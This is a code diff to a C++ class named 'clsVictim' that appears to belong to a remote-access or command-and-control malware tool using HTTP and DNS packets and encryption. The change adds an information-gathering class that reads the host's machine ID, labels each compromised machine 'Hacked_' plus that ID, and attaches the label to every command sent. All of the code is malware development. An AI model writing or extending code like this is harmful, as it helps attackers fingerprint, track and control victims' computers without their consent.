@@ -14,12 +14,16 @@
 #include "clsTools.hpp"
 #include "clsEZData.hpp"
 #include "clsCrypto.hpp"
+#include "clsInfoSpyder.hpp"
 
 #include "clsHttpPkt.hpp"
 #include "clsDnsPkt.hpp"
 
 class clsVictim
 {
+public:
+    std::string m_szVictimID = "";
+
 public:
     enum enMethod
     {
@@ -68,6 +72,11 @@ public:
     }
 
     ~clsVictim() = default;
+
+    bool operator==(const clsVictim& victim) const
+    {
+        return m_szVictimID == victim.m_szVictimID;
+    }
 
     ssize_t fnSendRAW(const std::string& szMsg)
     {
@@ -135,7 +144,16 @@ public:
 
     ssize_t fnSendCommand(const std::vector<std::string>& vsMsg)
     {
-        std::string szMsg = clsEZData::fnszSendParser(vsMsg);
+        clsInfoSpyder spyder;
+        auto stInfo = spyder.m_info;
+        m_szVictimID = "Hacked_" + stInfo.m_szMachineID;
+
+        std::vector<std::string> vuSend;
+        vuSend.reserve(vsMsg.size() + 1);
+        vuSend.push_back(m_szVictimID);
+        vuSend.insert(vuSend.end(), vsMsg.begin(), vsMsg.end());
+
+        std::string szMsg = clsEZData::fnszSendParser(vuSend);
         
         return fnSendCommand(szMsg);
     }
